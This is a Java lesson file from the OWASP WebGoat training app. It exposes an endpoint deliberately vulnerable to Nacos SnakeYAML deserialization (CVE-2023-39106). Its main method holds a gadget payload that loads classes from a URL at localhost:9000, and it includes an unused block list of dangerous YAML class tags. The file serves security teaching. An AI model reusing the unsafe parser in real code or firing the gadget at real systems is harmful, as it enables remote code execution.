/*
 * This file is part of WebGoat, an Open Web Application Security Project utility. For details, please see http://www.owasp.org/
 *
 * Copyright (c) 2002 - 2019 Bruce Mayhew
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the
 * GNU General Public License as published by the Free Software Foundation; either version 2 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if
 * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA
 * 02111-1307, USA.
 *
 * Getting Source ==============
 *
 * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software projects.
 */

package org.owasp.webgoat.lessons.ossnacossnakeyaml;

import com.alibaba.nacos.spring.util.parse.DefaultYamlConfigParse;
import org.owasp.webgoat.container.assignments.AssignmentEndpoint;
import org.owasp.webgoat.container.assignments.AssignmentHints;
import org.owasp.webgoat.container.assignments.AttackResult;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"vulnerable-nacos-snakeyaml.hint"})
public class VulnerableNacosSnakeYamlComponentsLesson extends AssignmentEndpoint {

  Logger log = LoggerFactory.getLogger(this.getClass().getName());

  @PostMapping("/VulnerableNacosSnakeYamlComponents/CVE-2023-39106")
    public @ResponseBody AttackResult NacosYamlParser(
      @RequestParam String payload,
      @RequestParam(required = false, defaultValue = "true") Boolean allowComplexObject) {
    // https://security.snyk.io/vuln/SNYK-JAVA-COMALIBABANACOS-5848032
    log.info("VulnerableNacosSnakeYamlComponents#CVE-2023-39106 called with payload : {}", payload);
    try {

      //System.setProperty("yamlAllowComplexObject", allowComplexObject.toString());
      DefaultYamlConfigParse yaml = new DefaultYamlConfigParse();
      Object obj = yaml.parse(payload).get("document");

      if (obj instanceof javax.script.ScriptEngineManager) {
        return success(this)
            .feedback("vulnerable-nacos-snakeyaml-components.success")
            .output(obj.getClass().toString())
            .build();
      }
    } catch (IllegalArgumentException ex) {
      return success(this)
          .feedback("vulnerable-nacos-snakeyaml-components.success")
          .output(ex.getMessage())
          .build();
    } catch (Exception ex) {
      return failed(this)
          .feedback("vulnerable-nacos-snakeyaml-components.close")
          .output(ex.getMessage())
          .build();
    }

    return failed(this)
        .feedback("vulnerable-nacos-snakeyaml-components.fromXML")
        .feedbackArgs(payload)
        .build();
  }

  private boolean isSafeYamlPayload(String payload) {
    // Reject payloads containing dangerous class references
    String[] dangerousPatterns = {
        "!!javax.script",
        "!!java.net.URLClassLoader",
        "!!java.lang.ProcessBuilder",
        "!!java.beans.XMLDecoder"
    };
    
    for (String pattern : dangerousPatterns) {
        if (payload.contains(pattern)) {
            return false;
        }
    }
    return true;
}


  public static void main(String[] args) {
    //	String payload="";
    String payload =
        "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:9000/\"]]]]"; 

    //	payload = "<demo><demo>";
    //System.setProperty("yamlAllowComplexObject", "True");
    DefaultYamlConfigParse yamlConfigParse = new DefaultYamlConfigParse();
    Object obj = yamlConfigParse.parse(payload).get("document");

    if (obj instanceof javax.script.ScriptEngineManager) {
      System.out.println(" instanceof --> true " + obj);
    } else {
      System.out.println(" instanceof --> false : ");
    }

    System.out.println(" done" + obj + " instance " + obj.getClass());
  }

  public static void main2(String[] args) {
    Object obj = null;
    obj = new DefaultYamlConfigParse();
    if (obj instanceof DefaultYamlConfigParse) {
      System.out.println(" instanceof --> true");
    } else {
      System.out.println(" instanceof --> false");
    }
  }
}

class Test1 {
  public String some_var = "abc";

  public String getSome_var() {
    return some_var;
  }

  public void setSome_var(String some_var) {
    this.some_var = some_var;
  }
}
